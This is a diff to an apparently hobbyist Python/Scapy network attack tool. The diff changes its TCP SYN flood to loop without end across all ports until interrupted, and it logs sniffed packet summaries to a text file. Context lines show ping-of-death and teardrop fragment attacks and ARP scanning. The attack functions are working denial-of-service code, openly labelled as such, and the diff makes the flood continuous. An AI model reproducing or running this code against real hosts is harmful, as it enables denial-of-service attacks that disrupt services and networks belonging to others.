@@ -125,11 +125,14 @@ def ping_of_death(target_ip):
 
 
 def tcp_syn_flood(target_ip):
-    print(f"[+] Starting TCP SYN Flood attack on {target_ip}...")
-    for port in range(1, 65535):
-        packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
-        send(packet, verbose=False)
-
+    try:
+        print(f"[+] Starting TCP SYN Flood attack on {target_ip}...")
+        while True:
+            for port in range(1, 65535):
+                packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
+                send(packet, verbose=False)
+    except KeyboardInterrupt:
+        print("\n[+] Stopping Dos spoofing attack. Closing the application...")
 
 def dos_attack():
     target_ip = input("Please enter the target IP address for the ping of death attack: ")    
@@ -142,7 +145,7 @@ def dos_attack():
 
     try:
         tcp_syn_flood(target_ip)
-        print(f"[+] TCP SYN Flood attack on {target_ip} initiated.")
+        print(f"[+] TCP SYN Flood attack on {target_ip} initiated. Use ctrl + C to stop the dos from running")
 
     except Exception as e:
         print(f"TCP SYN Flood Failed: {e}")
@@ -150,8 +153,14 @@ def dos_attack():
 
 
 def packet_handler(packet):
-    print(packet.summary())
-    
+    """Handles incoming packets and writes them to a file."""
+    print(packet.summary())  # Print to console
+
+    try:
+        with open("generated.pcap", "a") as f:  # Open in append mode
+            f.write(packet.summary() + "\n")  # Write packet details with newline
+    except Exception as e:
+        print(f"Error writing to file: {e}")
 
 
 def teardrop_attack():
@@ -163,6 +172,12 @@ def teardrop_attack():
         send(frag1)
         send(frag2)
         counter=counter+1
+
+
+
+
+
+
 
 if user_determination == "1":
     arp_and_ping_scanning()
